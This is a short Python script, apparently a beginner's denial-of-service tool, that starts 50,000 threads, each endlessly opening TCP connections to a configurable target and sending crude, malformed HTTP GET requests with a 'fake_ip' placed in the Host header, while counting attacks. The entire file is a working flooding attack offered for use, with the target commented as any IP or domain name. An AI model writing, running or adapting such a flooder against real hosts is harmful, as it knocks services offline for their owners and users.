# not actual multi threading but simulated multithreading (switching between tasks as fast as possible)
import threading # we are going to use multiple threads
import socket # use it to connect



target = '127.0.0.1' # ip address or domaine name
port=8000
fake_ip='122.51.26.1'
attack_counter=0
def attack():
    while True :
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # create an internet socket and speciifiyingsock_stream = protocole tcp
        s.connect((target,port))
        s.sendto(("GET/" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
        s.close()
        global attack_counter
        attack_counter+=1
        if attack_counter %500==0:
            print(attack_counter)
    
for i in range(50000):
    thread=threading.Thread(target=attack) # target =target function
    thread.start()
    

